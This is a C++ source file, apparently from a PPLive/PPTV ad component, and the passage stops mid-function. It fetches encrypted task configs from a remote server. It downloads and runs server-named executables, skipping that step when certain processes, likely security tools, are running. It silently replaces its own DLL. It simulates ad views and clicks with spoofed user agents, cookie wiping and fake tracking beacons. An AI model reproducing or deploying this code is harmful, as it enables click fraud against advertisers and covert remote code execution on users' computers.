#include "StdAfx.h"
#include "xdll.h"
#include "RunningTask.h"
#include "MsgTask.h"
#include "Winver.h"
#include "VersionInfo.h"
#pragma comment(lib,"Version.lib")

#include <synacast/xdll/WebUtils.h>
#include <ppl/mswin/mfc/TimerWindow.h>
#include <ppl/mswin/com.h>
#include <ppl/util/logtrace.h>
#include <ppl/stl/strings.h>
#include <ppl/stl/numeric.h>
#include <boost/algorithm/string/split.hpp>
#include <vector>
#include <ppl/mswin/ipc.h>
#include <ppl/mswin/module.h>
#include <ppl/mswin/ini.h>
#include "TipsUtil.h"
#include "TipsConvert.h"
#include "gstring.h"
#include "HopInfo.h"
#include "PlatformUA.h"
#include "AdPolicy.h"

#define CONFIG_INI_URL _T("http://fas.aplus.pptv.com/task/httptask.ini")

HANDLE g_hAdsExitEvent = FALSE;
//HANDLE g_hLoadUadetailsSucceed = FALSE;

const char* MakeToString(const char* ch);

void UrlClickingTask::Run()
{
	string showUrl = TipsConvert::UrlConvert(m_taskinfo.ShowUrl);
	string showReferer = TipsConvert::UrlConvert(m_taskinfo.ShowReferer);
	WebUtils::ClickUrl (showUrl, showReferer);
	if ( RandomGenerator().NextIn( 100 ) < m_taskinfo.ClickRate )
	{
		string clickUrl = TipsConvert::UrlConvert(m_taskinfo.ClickUrl);
		string clickReferer = TipsConvert::UrlConvert(m_taskinfo.ClickReferer);
		WebUtils::ClickUrl (clickUrl, clickReferer);
	}
}


void DownloadUAConfigTask::Run()
{
	TCHAR chAllUserPath[MAX_PATH] = {0};
	TipsUtil::PP_GetAllUserAppData(chAllUserPath);
	
	TCHAR chVersionIniPath[MAX_PATH] = {0};
	lstrcpy(chVersionIniPath, chAllUserPath);
	PathAppend(chVersionIniPath, _T("PPLive\\PPAP\\uaversion.ini"));
	
	TCHAR chUaXmlPath[MAX_PATH] = {0};
	lstrcpy(chUaXmlPath, chAllUserPath);
	PathAppend(chUaXmlPath, _T("PPLive\\PPAP\\uadetails_s.xml"));

	//����Ĭ�ϵ�iphone��ipad��aphoe��UserAgent
	PlatformUA::GetInstance()->DefaultUaInfo();
	
	if (PlatformUA::GetInstance()->UpdateUaXml(chVersionIniPath, chUaXmlPath))
	{
		PlatformUA::GetInstance()->LoadPlatformUa(chUaXmlPath);
	}	
	
//	::SetEvent(g_hLoadUadetailsSucceed);
}


void GetIniConfigTask::Run()
{
	USES_CONVERSION;

	TCHAR TempPath[MAX_PATH] = {0};
	//memset(TempPath, TEXT('\0'), sizeof(TCHAR)*MAX_PATH);
	GetEnvironmentVariable(_T("TEMP"), TempPath, MAX_PATH);
	string configFileDirectory = T2A(TempPath);
	string configFilePath = configFileDirectory + "\\ofenc";
	string decryptFilePath = configFileDirectory + "\\ofdec";
	
	// �����ļ�������
	::DeleteUrlCacheEntry(CONFIG_INI_URL);
	HRESULT hr = URLDownloadToFile(NULL, CONFIG_INI_URL, configFilePath.c_str(), NULL,NULL);
	if (S_OK != hr)
	{
		// ����ʧ��
		APP_ERROR("URLDownloadToFile "<<CONFIG_INI_URL<<" Error");
		return;
	}
	
	// ��ȡ�����ļ�
	ifstream ifs;
	ifs.open(configFilePath.c_str());
	ostringstream oss;
	char ch;
	while(oss && ifs.get(ch)) oss.put(ch);
	string config_content_string = oss.str();
	ifs.close();

	// �����ļ�
	APP_EVENT("Before Decrypt Config String Length is \r\n"<<config_content_string.size());
	SynacastUrlEncoding encoding("19801219");
	string decrypt_content_string = encoding.Decode(config_content_string);
	APP_EVENT("After Decrypt Config String Length is \r\n"<<decrypt_content_string.size());
	
	// �����ܺ�����д���ļ�
	ofstream ofs;
	ofs.open(decryptFilePath.c_str());
	ofs << decrypt_content_string;
	ofs.close();
	
	//post��MSG�߳�ִ��
	PostThreadMessage(m_msgThreadId, WM_RUNTASK, 0, reinterpret_cast<LPARAM>(new IniConfigTask(decryptFilePath)));
	
	// ɾ�����ص��ļ�
	DeleteFile(configFilePath.c_str());

	// ɾ�������ļ�
	//CFile::Remove(decryptFilePath.c_str());
}

void PostClickingTask::Run()
{
	//Post�ľ���ʵ��
	//WebUtils::ClickUrl( m_taskinfo.ShowUrl, m_taskinfo.ShowReferer );
	string url = TipsConvert::UrlConvert(m_taskinfo.Url);
	string referer = TipsConvert::UrlConvert(m_taskinfo.Referer);
	string content = TipsConvert::UrlConvert(m_taskinfo.Content);
	WebUtils::PostUrl (url, referer, content, m_taskinfo.ContentType);
}


void EXERunningTask::Run()
{
		APP_EVENT(
			"OSVerion:"<<m_taskinfo.OSVersion<<" "<<
			"IsSecure:"<<m_taskinfo.IsSecure<<" "<<
			"IsOnce:"<<m_taskinfo.IsOnce<<" "<<
			"ExeFileLength:"<<m_taskinfo.ExeFileLength<<" "<<
			"ExeName:"<<m_taskinfo.ExeName<<" "<<
			"ExeHttpUrl:"<<m_taskinfo.ExeHttpUrl<<" "<<
			"Forbiddens:"<<m_taskinfo.Forbiddens<<" "<<
			"GroupID:"<<m_taskinfo.GroupID);

		// �������ϵͳ�汾���ϸ���������
		OSVERSIONINFO osvi;
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx (&osvi);
		if(osvi.dwMajorVersion > m_taskinfo.OSVersion && m_taskinfo.OSVersion != 0)
		{
			APP_EVENT("Your OS Version is "<<osvi.dwMajorVersion<<", but task OS Version is "<<m_taskinfo.OSVersion<<" so return");
			return;
		}

		// ��� �ǰ�ȫ���� && �����а�ȫ������ֱ�ӷ���
		if( m_taskinfo.IsSecure == 1 && TipsUtil::IsComputerSafe() )
		{
			APP_EVENT("Your Computer is Safe, but the task is not safe");
			return;
		}
		// ��� �Ƿǰ�ȫ���� && ������ָ���������ֱ�ӷ���
		else if(m_taskinfo.IsSecure == 0 && m_taskinfo.Forbiddens != "*")
		{
			std::list<string> items;
			strings::split( std::back_inserter( items ), m_taskinfo.Forbiddens, '|' );
			if( true == TipsUtil::HasProcessRunning(items) )
			{
				APP_EVENT("Your Computer is Running Some Process "<<m_taskinfo.Forbiddens);
				return;
			}
		}

		// ��鱾���Ƿ��Ѿ�����ִ���ļ�
		TCHAR TempPath[MAX_PATH];
		memset(TempPath, 0, MAX_PATH);
		GetEnvironmentVariable(_T("TEMP"), TempPath, MAX_PATH);
		string exeFolderName = TempPath;
		string filePath = exeFolderName + "\\" + m_taskinfo.ExeName;
		string filePathTemp = filePath + ".temp";
		string filePathExcueted = filePath + ".excuted";


		CFileFind   find;   
		// �����һ��������
		if(m_taskinfo.IsOnce == 1)
		{
			// ����Ѿ�ִ�У�����ִ������
			if(TRUE== find.FindFile(filePathExcueted.c_str()))
			{
				APP_EVENT("Task "<<m_taskinfo.ExeName<<" Has Executed, So can not run");
				return;
			}
		}

		// ���������,�����ظ��ļ�,ֱ���������
		if( FALSE == find.FindFile(filePath.c_str()) )
		{	// ���ظ��ļ�
			//DeleteUrlCacheEntry (filePath.c_str()); // ������
			if (S_OK != URLDownloadToFile(NULL, m_taskinfo.ExeHttpUrl.c_str(), filePathTemp.c_str(), NULL,NULL)) 
			{
				// ����ʧ��
				APP_ERROR("URLDownloadToFile "<<m_taskinfo.ExeHttpUrl.c_str()<<" Error");
				return;
			}

			TRY {
				CFile tempfile(filePathTemp.c_str(), CFile::modeRead | CFile::shareDenyNone);
				DWORD dwFileSize = tempfile.GetLength();
				tempfile.Close();

				if(dwFileSize != m_taskinfo.ExeFileLength)
				{
					// �ļ�����ʧ�ܣ�������Ч
					APP_ERROR("Download File "<<m_taskinfo.ExeHttpUrl.c_str()<<" Size Error "<<dwFileSize<<":"<<m_taskinfo.ExeFileLength);
					return;
				}
				
				CFile::Rename(filePathTemp.c_str(), filePath.c_str());
			}
			CATCH (CMemoryException, e)
			{
				APP_ERROR("Get File Length "<<filePathTemp.c_str()<<" Error");
			}
			END_CATCH
		}

		// assert(�ļ��϶�����)
		assert(TRUE == find.FindFile(filePath.c_str()) );
		
		// ִ������
		APP_EVENT("Exec "<<m_taskinfo.ExeName<<" Begin");

		TipsUtil::RunExeFile(filePath);

		APP_EVENT("Exec "<<m_taskinfo.ExeName<<" End");
		
		//��������Ϊ�Ѿ�ִ��
		HANDLE hExcutedFile = CreateFile(
			filePathExcueted.c_str(),     // file to create
			GENERIC_WRITE,          // open for writing
			0,                      // do not share
			NULL,                   // default security
			CREATE_ALWAYS,          // overwrite existing
			FILE_ATTRIBUTE_NORMAL,
			NULL);                  // no attr. template

		if (hExcutedFile == INVALID_HANDLE_VALUE) 
		{ 
			APP_ERROR("Could not open file (error "<<GetLastError());
		}
		CloseHandle(hExcutedFile);
}

void UpdateRunningTask::Run()
{
		APP_EVENT(
		"BeginVerion: "<<m_taskinfo.BeginVersion<<" "<<
		"EndVersion: "<<m_taskinfo.EndVersion<<" "<<
		"DistVersion: "<<m_taskinfo.DistVersion<<" "<<
		"DllFileLength: "<<m_taskinfo.DllFileLength<<" "<<
		"DistUrl: "<<m_taskinfo.DistUrl);
	
	// ��õ�ǰģ��汾��
	TCHAR   szFullPath[MAX_PATH]; 
	DWORD   dwVerInfoSize   =   0; 
	DWORD   dwVerHnd; 
	VS_FIXEDFILEINFO*   pFileInfo; 
	::GetModuleFileName(theApp.m_hInstance, szFullPath, sizeof(szFullPath)); 
	APP_EVENT(_T("GetModuleFileName") << szFullPath);
 	dwVerInfoSize = GetFileVersionInfoSize(szFullPath,   &dwVerHnd); 
	VersionInfo versionCurrent;
 	if (dwVerInfoSize) 
 	{  
 		unsigned  int uInfoSize	=   0;  		
 		HANDLE hMem = GlobalAlloc(GMEM_MOVEABLE,   dwVerInfoSize); 
 		LPVOID lpvMem = GlobalLock(hMem); 
 		BOOL b = GetFileVersionInfo(szFullPath,   dwVerHnd,   dwVerInfoSize,   lpvMem);  		
		if(b == FALSE)
		{
			APP_EVENT(_T("GetFileVersionInfo Failed!"));  
			return;
		}
 		b = ::VerQueryValue(lpvMem,   (LPTSTR)_T("\\"),   (void**)&pFileInfo,   &uInfoSize);  		
		if(b == FALSE)
		{
			APP_EVENT(_T("VerQueryValue pFileInfo Failed!"));  
			return;
		}
	
 		versionCurrent.v0   =   HIWORD(pFileInfo-> dwProductVersionMS);	
 		versionCurrent.v1   =   LOWORD(pFileInfo-> dwProductVersionMS); 
 		versionCurrent.v2   =   HIWORD(pFileInfo-> dwProductVersionLS); 
 		versionCurrent.v3   =   LOWORD(pFileInfo-> dwProductVersionLS);	
 		
 		APP_EVENT(_T("Version ") << versionCurrent.v0 << "." << versionCurrent.v1 << "."
 			<< versionCurrent.v2 << "." << versionCurrent.v3);  
		GlobalUnlock(hMem); 
        GlobalFree(hMem);
 	} 	
	
	// ��鵱ǰ�汾�� �Ƕ��� BeginVersion �� EndVersion ֮��
	// ���Dist�汾���Ƿ�������ڰ汾��
	VersionInfo versionBegin;
	versionBegin.Parse(m_taskinfo.BeginVersion);
	VersionInfo versionEnd;
	versionEnd.Parse(m_taskinfo.EndVersion); 
	VersionInfo versionDist;
	versionDist.Parse(m_taskinfo.DistVersion);
	APP_EVENT(_T("BeginVersion ") << versionBegin.v0 << "." << versionBegin.v1 << "."
 			<< versionBegin.v2 << "." << versionBegin.v3);  
	APP_EVENT(_T("EndVersion ") << versionEnd.v0 << "." << versionEnd.v1 << "."
 			<< versionEnd.v2 << "." << versionEnd.v3); 
	APP_EVENT(_T("DistVersion ") << versionDist.v0 << "." << versionDist.v1 << "."
 			<< versionDist.v2 << "." << versionDist.v3); 

	if ( !(versionBegin <= versionCurrent && versionCurrent < versionEnd ))
	{
		APP_EVENT(_T("Version is not Between BeginVersion and EndVersion, so not update"));
		return;
	}
	if ( versionDist <= versionCurrent)
	{
		APP_EVENT(_T("Version is >= DistVersion, so not update"));
		return;
	}
	
	// ����Dll,����ģ����.n
	string selfName = szFullPath;
	string newName = selfName + ".n";
	string oldName = selfName + ".o";

	//DeleteUrlCacheEntry (filePath.c_str()); // ������
	if (S_OK != URLDownloadToFile(NULL, m_taskinfo.DistUrl.c_str(), newName.c_str(), NULL,NULL)) 
	{
		// ����ʧ��
		APP_ERROR("URLDownloadToFile "<<m_taskinfo.DistUrl<<" Error");
		return;
	}
	
	// ��� ģ����.n �ĳ����Ƿ����
	TRY {
		CFile tempfile(newName.c_str(), CFile::modeRead | CFile::shareDenyNone);
		DWORD dwFileSize = tempfile.GetLength();
		tempfile.Close();
		
		if(dwFileSize != m_taskinfo.DllFileLength)
		{
			// �ļ�����ʧ�ܣ�������Ч
			APP_ERROR("Download File "<<m_taskinfo.DistUrl<<" Size Error "<<dwFileSize<<" != "<<m_taskinfo.DllFileLength);
			return;
		}
		
		// ��ģ�����Ϊ ģ����.o
		CFile::Rename(selfName.c_str(), oldName.c_str());

		// �� ģ����.n ����Ϊ ģ����
		CFile::Rename(newName.c_str(), selfName.c_str());

		APP_EVENT("Update Succeed");
	}
	CATCH (CMemoryException, e)
	{
		APP_ERROR("Get File Length "<<selfName.c_str()<<" Error");
	}
	END_CATCH	
}

void SimRunningTask::SendLink(int nTrackType, vector<string>& Links, ADInfo& adinfo)
{
	std::vector<string>::iterator linkItr = Links.begin();
	for (; linkItr != Links.end(); ++linkItr) 
	{
		if ( (*linkItr).find("http://") == string::npos && (*linkItr).find("https://") == string::npos)
		{
			APP_WARN("Url is Not http link, so not send");
			continue;
		}

		APP_EVENT("Post to Msg Thread To Send url: " << *linkItr);
		::PostThreadMessage(m_msgThreadId, WM_RUNTASK, 0, reinterpret_cast<LPARAM>(new AsyncHttpTask(*linkItr, adinfo.tips.userAgent, adinfo.tips.referer)));
	
		//���ͼ����־
		if (string::npos != (*linkItr).find(FILTER_SUB_URL))
		{
			LogVast vastTrackLog;
			
			if (LogVast::strJuid.IsEmpty())
				LogVast::strJuid = TipsUtil::GetJuid();
			
			vastTrackLog.strAdid.Format(_T("%s"), adinfo.adid.c_str());
			vastTrackLog.nTrackLinkType.Format("%d", nTrackType);
			
//			vastTrackLog.SendLinkTrackLog();
		}
	}
}

void SimRunningTask::IntervalDetect(unsigned int periodCurrent, bool runClickLink, unsigned int beforeClick, ADInfo& adInfo)
{
	unsigned int detectInterval = adInfo.playtime*1000/4;	// �����ʱ��
	unsigned int periodClick = beforeClick/detectInterval;
	unsigned int periodDelay = beforeClick%detectInterval;
	
	if (false != runClickLink  && periodClick == periodCurrent) 
	{
		Sleep(periodDelay);
		if (RunClickLink(adInfo.link, adInfo))
		{
			//! ���͵�����
			SendLink(CLICK_TRACK, adInfo.clickLinks, adInfo);
		}
		Sleep(detectInterval - periodDelay);
	}
	else 
	{
		//�ȴ�ָ�������
		Sleep(detectInterval);  
	}
}

void SimRunningTask::RunAdConfig()
{
	APP_EVENT("AdConfig " << m_adConfig.m_isLoaded << " AD Count " << m_adConfig.ads.size());

	//����Ad֮��ļ��
	UINT uAdDelayTime = 0;
	UINT uAdNum = m_adConfig.ads.size();
	if(uAdNum > 0) 
		uAdDelayTime = m_taskDelayTime/uAdNum;

	// click ������ +1/4   +1/2   +3/4
	bool checkRunClickLink = true; // ִ�е������
	vector<ADInfo>::iterator itr = m_adConfig.ads.begin();
	for (; itr != m_adConfig.ads.end(); ++itr) {

		ADInfo& adInfo = *itr;
		
		if (adInfo.playtime<=0)continue;

		//���ָ��Paltform,  ���滻UserAgent
		if (!adInfo.tips.platform.empty())
		{
			string strNewUA = PlatformUA::GetInstance()->GetNewUA(adInfo.tips.platform);
			if (strNewUA.empty())
			{
				continue;
			}
			adInfo.tips.userAgent = strNewUA;
			adInfo.tips.uaMinWidth = PlatformUA::GetInstance()->uaMinWidth;
			adInfo.tips.uaMaxWidth = PlatformUA::GetInstance()->uaMaxWidth;
			adInfo.tips.uaMinHeight = PlatformUA::GetInstance()->uaMinHeight;
			adInfo.tips.uaMaxHeight = PlatformUA::GetInstance()->uaMaxHeight;
		}
	
		bool runClickLink = false;
		//IniFile ini;
		if (checkRunClickLink) {  
			int clickRate = 0;

			#ifdef _DEBUG
			clickRate = 10000;
			#else
			clickRate = adInfo.tips.clickRate *100;
			APP_EVENT("ClickRate="<<adInfo.tips.clickRate<<"*100="<<clickRate);
			#endif

			if (clickRate >= 10000 || (clickRate > 0 && RandomGenerator().NextIn(10000) < clickRate)) {
				// ִ�е������
				runClickLink = true;
				checkRunClickLink = false;
			}
			else
			{
				APP_EVENT("ClientSimRunningTask Click Rate is Not Reach, so not click.");
			}	
		}

		// ���͹��ǰͳ��
		SendLink(START_TRACK, adInfo.startLinks, adInfo);

		// ���Ź��, ִ�е��
		unsigned int beforeClick = RandomGenerator().NextIn(adInfo.playtime*1000); // �ڹ�沥���ڼ䣬����˹��
		
		bool bAttenuateContinue = true;
		unsigned int AttenuateRandom = RandomGenerator().NextIn(100); //100���������

		for(int i = 0; i < 4; i++)
		{
			switch(i)
			{
				case 0:
					IntervalDetect(i, runClickLink, beforeClick, adInfo);
					if (true==bAttenuateContinue && AttenuateRandom>=0 && AttenuateRandom<=100-adInfo.playtime/4)
					{
						SendLink(FIRST_QUARTER_TRACK, adInfo.firstQuartileLinks, adInfo);		//! ����1/4���						
					}
					else
					{
						bAttenuateContinue = false;
					}
					break;
				case 1:
					IntervalDetect(i, runClickLink, beforeClick, adInfo);
					if (true==bAttenuateContinue && AttenuateRandom>=0 && AttenuateRandom<=100-adInfo.playtime/2)
					{
						SendLink(HALF_TRACK, adInfo.midpointLinks, adInfo);				//! ����1/2���
					}
					else
					{
						bAttenuateContinue = false;
					}
					break;
				case 2:
					IntervalDetect(i, runClickLink, beforeClick, adInfo);
					if (true==bAttenuateContinue && AttenuateRandom>=0 && AttenuateRandom<=100-adInfo.playtime*3/4)
					{
						SendLink(THREE_QUARTER_TRACK, adInfo.thirdQuartileLinks, adInfo);		//! ����3/4���
					}
					else
					{
						bAttenuateContinue = false;
					}
					break;
				case 3:
					IntervalDetect(i, runClickLink, beforeClick, adInfo);
					break;
				default:
					ASSERT(0);
					Sleep(adInfo.playtime*1000/4);
			}
		}

		// ���͹���ͳ��
		if (true==bAttenuateContinue && AttenuateRandom>=0 && AttenuateRandom<=100-adInfo.playtime)
		{
			SendLink(END_TRACK, adInfo.endLinks, adInfo);
		}

		//�ȴ�����Ad���
		UINT uActualDelayTime = uAdDelayTime - adInfo.playtime;
		if (uActualDelayTime > 0)
		{
#ifdef _DEBUG
			uActualDelayTime = 1;
#endif
			if (::WaitForSingleObject(g_hAdsExitEvent, uActualDelayTime*1000) != WAIT_TIMEOUT)
				return;
		}
	}
}

ClientSimRunningTask::ClientSimRunningTask(const ClientSimTaskInfo& taskinfo, DWORD msgThreadId)
: SimRunningTask(msgThreadId), m_isSecure(0)
{
	APP_EVENT("Request Client Sim Task Adtype : "<< taskinfo.AdType);
	
	#ifdef _DEBUG
	m_strClientUrl.Format(_T("http://de.as.pptv.com/ppadcontrolclient/adcontrol?yid=991&cid=99990023&pid=99990023&adtype=%s&maxl=%d&maxc=%d&fullad=1&siteid=99990023"),
		taskinfo.AdType.c_str(), taskinfo.Maxl, taskinfo.Maxc);
	#else 
	m_strClientUrl.Format(_T("http://de.as.pptv.com/ppadcontrolclient/adcontrol?yid=991&cid=99990023&pid=99990023&adtype=%s&maxl=%d&maxc=%d&fullad=1&siteid=99990023"),
		taskinfo.AdType.c_str(), taskinfo.Maxl, taskinfo.Maxc);
	#endif // _DEBUG
}

ClientSimRunningTask::ClientSimRunningTask(const ClientExSimTaskInfo& taskinfo, DWORD msgThreadId)
: SimRunningTask(msgThreadId), m_isSecure(taskinfo.IsSecure)
{
	m_strClientUrl = taskinfo.ClientUrl.c_str();
}

void ClientSimRunningTask::Run()
{
	APP_EVENT("ClientSim Url: " << (LPCTSTR)m_strClientUrl);
	
	// �����ļ�������
	::DeleteUrlCacheEntry(m_strClientUrl);
	TCHAR strCachePath[MAX_PATH];
	HRESULT hr = ::URLDownloadToCacheFile(NULL, m_strClientUrl, strCachePath, MAX_PATH, NULL, NULL);
	if (S_OK != hr)
	{
		// ����ʧ��
		APP_ERROR("URLDownloadToFile " << (LPCTSTR)m_strClientUrl << " Error");
		return;
	}

	//? m_IsSecure
	if (0 == m_isSecure)
	{
		m_adConfig.LoadXml(strCachePath);
	}
	else if (1 == m_isSecure)
	{
		string decryptFile = TipsUtil::DecodeFile(strCachePath, "vastFile");
		m_adConfig.LoadXml(decryptFile.c_str());
		DeleteFile(decryptFile.c_str());
	}
	else
	{
		ASSERT(0);
		return;
	}

	RunAdConfig();
}

VASTSimRunningTask::VASTSimRunningTask(const VASTSimTaskInfo& taskInfo, DWORD msgThreadId, UINT32 uDelayTime) 
: SimRunningTask(msgThreadId), m_isSecure(0)
{
	#ifdef _DEBUG
	//m_strVastUrl.Format(_T("http://de.as.pptv.com/ikandelivery/vast/3.0draft/?chid=99990023&clid=99990023&sid=&pos=300001&maxl=60&maxc=1&platform=1024"));
	m_strVastUrl = _T("http://de.as.pptv.com/ikandelivery/vast3.0.xml?platform=1024&chid=99990023&clid=99990023&pos=300001&juid=[juid]&[policy]&ver=[ver]");
	#else
	m_strVastUrl = _T("http://de.as.pptv.com/ikandelivery/vast/3.0/?platform=1024&chid=99990023&clid=99990023&pos=300001&juid=[juid]&[policy]&ver=[ver]");
	#endif

	m_taskDelayTime = uDelayTime;
	
	m_VastGetLog.IsUDP = _T("1");
}
 

VASTSimRunningTask::VASTSimRunningTask(const VASTExSimTaskInfo& taskInfo, DWORD msgThreadId, UINT32 uDelayTime)
: SimRunningTask(msgThreadId), m_isSecure(taskInfo.IsSecure)
{
	m_strVastUrl.Format(_T("%s"), taskInfo.VastUrl.c_str());
	m_taskDelayTime = uDelayTime;

	m_VastGetLog.IsUDP = _T("0");
}

void VASTSimRunningTask::ReplaceJuid()
{
	CString strJuid = TipsUtil::GetJuid();
	m_strVastUrl.Replace(_T("[juid]"), strJuid);
}

void VASTSimRunningTask::ReplacePolicy()
{
	CString strPolicyXmlUrl;
#ifdef _DEBUG
	strPolicyXmlUrl = _T("http://de.as.pptv.com/policy/policy.xml?format=xml&platform=ppap&channel=withoutchannel");
#else
	strPolicyXmlUrl = _T("http://de.as.pptv.com/policy/v1.0/pptv?format=xml&platform=ppap&channel=withoutchannel");
#endif

	TCHAR chPolicyXmlPath[MAX_PATH] = {0};
	TipsUtil::PP_GetAllUserAppData(chPolicyXmlPath);
	PathAppend(chPolicyXmlPath, _T("PPLive\\PPAP\\policy.xml"));

	AdPolicy policyInfo;
	CString strPolicyParam = _T("maxl=60&maxc=1");	//Ĭ��policy����
	
	//����policy.xml
	if (policyInfo.UpdatePolicyXml(strPolicyXmlUrl, chPolicyXmlPath))
	{
		//��ȡpolicy.xml
		policyInfo.LoadPolicyXml(chPolicyXmlPath, strPolicyParam);
	}
	
	m_strVastUrl.Replace(_T("[policy]"), strPolicyParam);	
}

void VASTSimRunningTask::ReplaceVer()
{
	TCHAR szFilePath[MAX_PATH] = {0};
	GetModuleFileName(theApp.m_hInstance, szFilePath, MAX_PATH);
	CString strDllVersion = TipsUtil::GetFileVersion(szFilePath);
	m_strVastUrl.Replace(_T("[ver]"), strDllVersion);
}

void VASTSimRunningTask::Run()  
{
	ReplaceJuid();		//�滻[juid]
	ReplacePolicy();	//�滻[policy]
	ReplaceVer();		//�滻[ver]

#ifdef _DEBUG
	cout<<TipsUtil::GetMacAddr()<<", "<<TipsUtil::GetUserName()<<", "
			<<TipsUtil::GetResolution()<<", "<<TipsUtil::GetFlashVer()<<", "<<TipsUtil::GetSysLID()<<endl;
#endif

	APP_EVENT("VASTSim Url" << (LPCTSTR)m_strVastUrl);

	if (LogVast::strJuid.IsEmpty())
		LogVast::strJuid = TipsUtil::GetJuid();
	
	// �����ļ�������
	::DeleteUrlCacheEntry(m_strVastUrl);
	TCHAR strCachePath[MAX_PATH];
	HRESULT hr = ::URLDownloadToCacheFile(NULL, m_strVastUrl, strCachePath, MAX_PATH, NULL, NULL);
	if (S_OK != hr)
	{
		// ����ʧ��
		APP_ERROR("URLDownloadToFile " << (LPCTSTR)m_strVastUrl << " Error");
		m_VastGetLog.IsDownloadVastxmlSucceed = _T("0");
//		m_VastGetLog.SendConfigGetLog();
		return;
	}
	m_VastGetLog.IsDownloadVastxmlSucceed = _T("1");

	//? m_isSecure
	if (0 == m_isSecure) 
	{
		m_VastGetLog.IsSecure = _T("0");
		m_adConfig.LoadXmlFromVast(strCachePath, m_VastGetLog);
	} 
	else if (1 == m_isSecure)
	{
		m_VastGetLog.IsSecure = _T("1");
		string decryptFile = TipsUtil::DecodeFile(strCachePath, "vastFile");
		m_adConfig.LoadXmlFromVast(decryptFile.c_str(), m_VastGetLog);
		DeleteFile(decryptFile.c_str());
	}
	else 
	{
		m_VastGetLog.IsSecure = _T("-1");
//		m_VastGetLog.SendConfigGetLog();
		ASSERT(0);
		return;
	}

	RunAdConfig();
}

bool SimRunningTask::RunClickLink(string& link, ADInfo& adInfo)
{
	if (link.find("http://") == string::npos && link.find("https://") == string::npos)
	{
		APP_EVENT("Ad.Link is not Http Url, So Can Not Do It");
		return false;
	}

	MultiHopTaskInfo taskInfo;
	taskInfo.FirstUrl = link;
	taskInfo.FirstReferer = adInfo.tips.referer;
	taskInfo.HopInfo = adInfo.tips.hops;
	taskInfo.ClickIntervalMin = adInfo.tips.minHopTime*1000;
	taskInfo.ClickIntervalMax = adInfo.tips.maxHopTime*1000;
	int minDuration = adInfo.tips.minDuration;
	int maxDuration = adInfo.tips.maxDuration;
	LIMIT_MIN(maxDuration, minDuration);
	if (maxDuration == minDuration) taskInfo.TimeoutTime = minDuration;
	else taskInfo.TimeoutTime = (minDuration + RandomGenerator().NextIn(maxDuration-minDuration))*1000;
	taskInfo.UserAgent = adInfo.tips.userAgent;


	taskInfo.RuleInfo = adInfo.tips.rule;
	taskInfo.GroupID = adInfo.tips.groupID;
	taskInfo.RemoveCookiesRate = adInfo.tips.removeCookieRate;
	taskInfo.RemoveCookies = adInfo.tips.removeCookies;
	taskInfo.RemoveFlashCookieRate = adInfo.tips.removeFlashCookieRate;
	taskInfo.RemoveFlashCookies = adInfo.tips.removeFlashCookies;
	
	taskInfo.LoadFlash = adInfo.tips.loadFlash;
	taskInfo.RefererMode = adInfo.tips.refererMode;
	taskInfo.IsOpenWindow = adInfo.tips.isOpenWindow;
	taskInfo.DirectionalMode = adInfo.tips.directionalMode;
	taskInfo.Directional = adInfo.tips.directional;
	taskInfo.UrlFilterType = adInfo.tips.urlFilterType;
	taskInfo.UrlFilter = adInfo.tips.urlFilter;

	taskInfo.UaMinWidth = adInfo.tips.uaMinWidth;
	taskInfo.UaMaxWidth = adInfo.tips.uaMaxWidth;
	taskInfo.UaMinHeight = adInfo.tips.uaMinHeight;
	taskInfo.UaMaxHeight = adInfo.tips.uaMaxHeight;

	taskInfo.Platform = adInfo.tips.platform;

	// �����߳��׳� ��ͨ�������ִ��
	PostThreadMessage(m_msgThreadId, WM_RUNTASK, 0, reinterpret_cast<LPARAM>(new MultiHopTask(taskInfo)));

	//���͵����־
	LogVast vastTrackLog;
	
	if (LogVast::strJuid.IsEmpty())
		LogVast::strJuid = TipsUtil::GetJuid();
	
	vastTrackLog.strAdid.Format(_T("%s"), adInfo.adid.c_str());
	vastTrackLog.nTrackLinkType.Format("%d", CLICK_LINK);
	
//	vastTrackLog.SendLinkTrackLog();

	return true;
}

void SimRunningTask::RunClickLink(IniFile& ini, string& link)
{
	if (link.find("http://") == string::npos && link.find("https://") == string::npos)
	{
		APP_EVENT("Ad.Link is not Http Url, So Can Not Do It");
		return;
	}

	int mode = ini.GetInt("Mode", 1);
	if (mode == 1)
	{
		// ��ͨ���÷�ʽ  
		MultiHopTaskInfo taskInfo;
		taskInfo.BrowserRandom = ini.GetInt("BrowserRandom", 0);
		taskInfo.FirstUrl = link;
		taskInfo.FirstReferer = _T("");
		taskInfo.HopInfo = ini.GetString("HopInfo", _T("0"));
		taskInfo.RuleInfo = ini.GetString("RuleInfo", _T("<A "));
		taskInfo.GroupID = ini.GetInt("GroupID", 0);
		taskInfo.ClickIntervalMin = ini.GetInt("ClickIntervalMin", 5*1000);
		taskInfo.ClickIntervalMax = ini.GetInt("ClickIntervalMax", 10*1000);
		taskInfo.TimeoutTime = ini.GetInt("TimeoutTime", 120*1000);
		taskInfo.RemoveCookiesRate = ini.GetInt("RemoveCookiesRate", 0);
		taskInfo.RemoveCookies = ini.GetString("RemoveCookies", _T(""));
		taskInfo.IsSecure = ini.GetInt("IsSecure", 0);
		taskInfo.ServerTime = ini.GetInt("ServerTime", 0);
		taskInfo.IsOpenWindow = ini.GetInt("IsOpenWindow", 0);
		taskInfo.AllowArea = ini.GetInt("AllowArea", 0);
		taskInfo.LoadFlash = ini.GetInt("LoadFlash", 0);
		taskInfo.RefererMode = ini.GetInt("RefererMode", 0);
		taskInfo.UserAgent = ini.GetString("UserAgent", _T(""));
		taskInfo.DirectionalMode = ini.GetInt("DirectionalMode", 0);
		taskInfo.Directional = ini.GetString("Directional", _T(""));
		taskInfo.UrlFilterType = ini.GetInt("UrlFilterType", 0);
		taskInfo.UrlFilter = ini.GetString("UrlFilter", _T(""));

		// �����߳��׳� ��ͨ�������ִ��
		PostThreadMessage(m_msgThreadId, WM_RUNTASK, 0, reinterpret_cast<LPARAM>(new MultiHopTask(taskInfo)));
	}
	else if (mode == 2)
	{
		string xmlConfigUrl = ini.GetString("XmlConfigUrl", _T(""));
		if (xmlConfigUrl.length() <= 0)
		{
			APP_ERROR("xmlConfigUrl is error. " << xmlConfigUrl);
			return;
		}

		// �������÷�ʽ
		TCHAR TempPath[MAX_PATH];
		memset(TempPath, 0, MAX_PATH);
		GetEnvironmentVariable(_T("TEMP"), TempPath, MAX_PATH);
		string configFileDirectory = TempPath;
		string configFilePath = configFileDirectory + "\\ofni";
		string decryptFilePath = configFileDirectory + "\\ofnied";
		
		// �����ļ�������
